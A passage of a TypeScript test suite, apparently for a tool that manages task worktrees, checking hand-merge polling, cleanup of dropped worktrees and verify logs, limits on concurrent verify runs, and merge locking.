			if (old === undefined) delete process.env.PI_ROOST_HAND_MERGE_MS;
			else process.env.PI_ROOST_HAND_MERGE_MS = old;
		}
	});

	it("hand merges are looked for at most every 10 seconds (by the clock)", async () => {
		const old = process.env.PI_ROOST_HAND_MERGE_MS;
		delete process.env.PI_ROOST_HAND_MERGE_MS;
		try {
			const r = repo();
			const { clock, advance } = manualClock(1_000_000);
			const w = world(clock);
			const a = await finished(w, r, 1, "schema");
			w.live.clear();
			await w.ws.handMerges(); // looked: nothing yet
			git(r, "merge", "--ff-only", "-q", a.branch);
			advance(9_999);
			await w.ws.handMerges();
			expect(a.t.workspace?.stage).toBe("review");
			advance(1);
			await w.ws.handMerges();
			expect(a.t.workspace?.stage).toBe("merged");
		} finally {
			if (old !== undefined) process.env.PI_ROOST_HAND_MERGE_MS = old;
		}
	});

	it("cleanup: dry lists, yes removes clean worktrees of dropped tasks and of task branches no task holds, and old verify logs; never one with changes", async () => {
		const r = repo();
		const { clock } = manualClock(Date.now());
		const w = world(clock);
		const a = await finished(w, r, 1, "dropped clean");
		const b = await finished(w, r, 2, "dropped dirty");
		const c = await finished(w, r, 3, "dropped later");
		const keep = await finished(w, r, 4, "still in review");
		w.live.clear();
		writeFileSync(join(b.path, "wip.txt"), "x\n");
		// drop: a clean worktree goes at once, a dirty one stays and says so
		expect(await w.ws.drop(a.t, () => void (a.t.state = "dropped"))).toBe(`worktree removed · branch ${a.branch} kept`);
		expect(await w.ws.drop(b.t, () => void (b.t.state = "dropped"))).toContain("has uncommitted changes");
		expect(existsSync(a.path)).toBe(false);
		// c was dropped some other way: its clean worktree is left behind
		c.t.state = "dropped";
		// a worktree of a task branch no task holds; one made moments ago may be a start under way
		const orphan = await makeTaskWorktree(r, 999, "orphan");
		const young = await makeTaskWorktree(r, 998, "young");
		const hour = (Date.now() - 3_600_000) / 1000;
		utimesSync(orphan.path, hour, hour);
		// verify logs: of a done or dropped task (or none), not of one still in review
		const logs = join(roostHome(), "verify");
		mkdirSync(logs, { recursive: true });
		writeFileSync(join(logs, `${a.t.id}-1.log`), "ok\n");
		writeFileSync(join(logs, "77-1.log"), "ok\n");
		writeFileSync(join(logs, `${keep.t.id}-1.log`), "ok\n");

		const dry = (await w.ws.cleanup(true)).join("\n");
		expect(dry).toContain(`#${b.t.id} kept: ${b.path} has uncommitted changes`);
		expect(dry).toContain(`#${c.t.id} dropped: remove ${c.path} (branch ${c.branch} kept)`);
		expect(dry).toContain(`${orphan.branch}: remove ${orphan.path}`);
		expect(dry).not.toContain(young.branch);
		expect(dry).toContain("remove 2 verify logs");
		expect(existsSync(c.path) && existsSync(orphan.path) && existsSync(join(logs, `${a.t.id}-1.log`))).toBe(true);

		const done = (await w.ws.cleanup(false)).join("\n");
		expect(done).toContain(`#${c.t.id}: worktree removed · branch ${c.branch} kept`);
		expect(done).toContain(`${orphan.branch}: worktree removed · branch kept`);
		expect(done).toContain("removed 2 verify logs");
		expect(existsSync(c.path)).toBe(false);
		expect(existsSync(orphan.path)).toBe(false);
		expect(existsSync(young.path)).toBe(true);
		expect(existsSync(b.path)).toBe(true); // changes: never
		expect(existsSync(keep.path)).toBe(true); // not dropped or merged
		expect(git(r, "branch", "--list", c.branch, orphan.branch)).toContain(orphan.branch);
		expect(existsSync(join(logs, `${a.t.id}-1.log`))).toBe(false);
		expect(existsSync(join(logs, "77-1.log"))).toBe(false);
		expect(existsSync(join(logs, `${keep.t.id}-1.log`))).toBe(true);
		expect(await w.ws.cleanup(true)).toEqual([expect.stringContaining(`#${b.t.id} kept`)]);
	});

	it("at most 2 Verifies run at once in a repository: a third is queued and starts when one ends; another repository is not counted", async () => {
		const project = { verify: "check" };
		const r = repo(project);
		const r2 = repo(project);
		const w = world();
		await approveShown(w, newTask(90, r));
		await approveShown(w, newTask(91, r2));
		const one = await finished(w, r, 1);
		const two = await finished(w, r, 2);
		const three = await finished(w, r, 3);
		expect(one.t.workspace).toMatchObject({ stage: "verifying", note: "running check" });
		expect(two.t.workspace).toMatchObject({ stage: "verifying", note: "running check" });
		expect(three.t.workspace).toMatchObject({ stage: "verifying", note: "queued" });
		expect(w.shells().map((j) => j.meta?.verifyOf)).toEqual([1, 2]);
		// the other repository has slots of its own
		const other = await finished(w, r2, 4);
		expect(other.t.workspace).toMatchObject({ stage: "verifying", note: "running check" });
		expect(w.shells().map((j) => j.meta?.verifyOf)).toEqual([1, 2, 4]);
		// one ends: the queued one starts
		w.ws.commandEnded(w.shells()[0]!.id, { verifyOf: 1 }, 0);
		expect(one.t.workspace?.stage).toBe("review");
		await eventually(() => expect(three.t.workspace).toMatchObject({ stage: "verifying", note: "running check" }));
		expect(w.shells().map((j) => j.meta?.verifyOf)).toEqual([1, 2, 4, 3]);
		// a task dropped while it queues is not started: by drop (it leaves the queue) ...
		const four = await finished(w, r, 5);
		expect(four.t.workspace?.note).toBe("queued");
		await w.ws.drop(four.t, () => void (four.t.state = "dropped"));
		// ... or marked dropped some other way (the queue looks again when it pumps)
		const five = await finished(w, r, 6);
		expect(five.t.workspace?.note).toBe("queued");
		five.t.state = "dropped";
		w.ws.commandEnded(w.shells().find((j) => j.meta?.verifyOf === 2)!.id, { verifyOf: 2 }, 0);
		// a slot is free: a task queued after them proves the queue was pumped
		const six = await finished(w, r, 7);
		await eventually(() => expect(six.t.workspace).toMatchObject({ stage: "verifying", note: "running check" }));
		expect(w.shells().map((j) => j.meta?.verifyOf)).toEqual([1, 2, 4, 3, 7]);
	});

	it("one merge per repository at a time: a second started together is a conflict; after the first it merges", async () => {
		const r = repo();
		const w = world();
		const a = await finished(w, r, 1, "first");
		const b = await finished(w, r, 2, "second");
		w.live.clear();
		const [x, y] = await Promise.allSettled([w.ws.act(person, a.t, "merge", {}), w.ws.act(person, b.t, "merge", {})]);
		expect(x.status).toBe("fulfilled");
		expect(y).toMatchObject({ status: "rejected", reason: { code: "conflict", message: expect.stringContaining("a merge in") } });
		expect(a.t.workspace?.stage).toBe("merged");
		expect(b.t.workspace?.stage).toBe("review"); // untouched
		expect(b.t.workspace?.merge).toBeUndefined();
		// the repository is free again: the second merges (it syncs onto the first)
		const later = await w.ws.act(person, b.t, "merge", {});
		expect(later.note).toContain("merged into main");
		expect(git(r, "log", "--format=%s", "main")).toContain("work");
	});

	it("a merge while another process holds the repository's merge lock is a conflict, and leaves the task in review", async () => {
		const r = repo();
		const w = world();
		const a = await finished(w, r, 1);
		w.live.clear();
		let release!: () => void;
		const hold = new Promise<void>((res) => (release = res));
		let acquired!: () => void;
		const got = new Promise<void>((res) => (acquired = res));
		const held = withMergeLock(r, async () => {
			acquired();
			await hold;
		});
		await got;
		await expect(w.ws.act(person, a.t, "merge", {})).rejects.toMatchObject({ code: "conflict", message: expect.stringContaining("lock") });
		expect(a.t.workspace?.stage).toBe("review");
		expect(git(r, "log", "--format=%s", "main")).not.toContain("work");
		release();
		await held;
		expect((await w.ws.act(person, a.t, "merge", {})).note).toContain("merged into main");
	});
});
